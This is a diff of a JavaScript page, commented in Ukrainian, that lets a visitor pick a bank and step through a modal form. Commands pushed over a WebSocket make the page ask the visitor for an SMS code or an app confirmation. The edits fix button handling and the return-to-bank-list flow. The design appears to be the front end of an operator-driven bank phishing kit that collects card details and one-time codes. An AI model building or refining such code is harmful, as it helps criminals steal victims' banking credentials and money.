@@ -945,6 +945,7 @@ document.addEventListener('DOMContentLoaded', () => {
         return isValid;
     }
 
+    // --- ПОЧАТОК: ЗАМІНА renderStep (Виправлення 2) ---
     function renderStep() {
         const step = activeBankData.steps[currentStepIndex];
         let html = '';
@@ -980,10 +981,18 @@ document.addEventListener('DOMContentLoaded', () => {
         modalTitle.textContent = step.title;
         stepContent.innerHTML = html;
         modalFooter.style.display = 'flex';
+        
+        // Видаляємо будь-які тимчасові кнопки (наприклад, "Обрати інший банк" або "Відправити SMS")
+        const tempBtns = modalFooter.querySelectorAll('.temp-btn');
+        tempBtns.forEach(btn => btn.remove());
+
+        // Показуємо стандартні кнопки
         backBtn.style.display = 'block'; // Завжди показуємо кнопку "Назад"
         nextBtn.style.display = 'block';
+
         addInputFormatting();
     }
+    // --- КІНЕЦЬ: ЗАМІНА renderStep ---
 
     document.querySelectorAll('#page-banks .bank-item').forEach(item => {
         item.addEventListener('click', e => {
@@ -1003,26 +1012,63 @@ document.addEventListener('DOMContentLoaded', () => {
     nextBtn.addEventListener('click', handleNextStep);
     backBtn.addEventListener('click', handleBackStep);
 
+    // --- ПОЧАТОК: ЗАМІНА handleServerCommand (Виправлення 1 і 2) ---
     function handleServerCommand(command) {
         const { type, data } = command;
+        
+        // Ця функція більше не використовує innerHTML, щоб не знищувати оригінальні кнопки
         const showMessageWithButton = (title, text, btnText, callback) => {
             modalTitle.textContent = title;
             stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
+            
+            // Ховаємо оригінальні кнопки
+            nextBtn.style.display = 'none';
+            backBtn.style.display = 'none';
+
+            // Видаляємо старі тимчасові кнопки (про всяк випадок)
+            const oldTempBtns = modalFooter.querySelectorAll('.temp-btn');
+            oldTempBtns.forEach(btn => btn.remove());
+
+            // Створюємо і додаємо нову тимчасову кнопку
+            const tempBtn = document.createElement('button');
+            tempBtn.className = 'btn btn-back temp-btn'; // Використовуємо стиль "btn-back" і клас "temp-btn"
+            tempBtn.textContent = btnText;
+            tempBtn.addEventListener('click', callback);
+            
+            modalFooter.appendChild(tempBtn);
             modalFooter.style.display = 'flex';
-            modalFooter.innerHTML = `<button class="btn btn-back">${btnText}</button>`;
-            modalFooter.querySelector('button').addEventListener('click', callback);
         };
         
-        // Перезавантаження сторінки тепер повертає на сторінку "Apply"
-        const reloadCallback = () => showPage(pageApply);
+        
+        // Змінюємо дію "перезавантаження" з pageApply на pageBanks
+        const reloadCallback = () => {
+            body.classList.remove('form-active'); // Ховаємо модальне вікно
+            if (ws) { ws.close(); } // Закриваємо WebSocket
+            showPage(pageBanks); // Повертаємо на екран вибору банку
+        };
 
         switch (type) {
             case 'sms':
                 modalTitle.textContent = 'Введіть код з SMS';
                 stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
+                
+                // Ховаємо оригінальні кнопки
+                nextBtn.style.display = 'none';
+                backBtn.style.display = 'none';
+                
+                // Видаляємо старі тимчасові кнопки
+                const oldTempBtns = modalFooter.querySelectorAll('.temp-btn');
+                oldTempBtns.forEach(btn => btn.remove());
+
+                // Створюємо і додаємо кнопку SMS
+                const smsBtn = document.createElement('button');
+                smsBtn.className = 'btn btn-next temp-btn'; // Використовуємо стиль "btn-next" і клас "temp-btn"
+                smsBtn.id = 'submit-sms-code'; // ID залишаємо для функції submitSmsCode
+                smsBtn.textContent = 'Відправити';
+                smsBtn.addEventListener('click', submitSmsCode);
+                
+                modalFooter.appendChild(smsBtn);
                 modalFooter.style.display = 'flex';
-                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
-                modalFooter.querySelector('#submit-sms-code').addEventListener('click', submitSmsCode);
                 break;
             case 'app':
                 modalTitle.textContent = 'Підтвердження';
@@ -1074,6 +1120,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
         }
     }
+    // --- КІНЕЦЬ: ЗАМІНА handleServerCommand ---
 
     // ---------- БЛОК С ИЗМЕНЕНИЯМИ ----------
     async function submitSmsCode() {
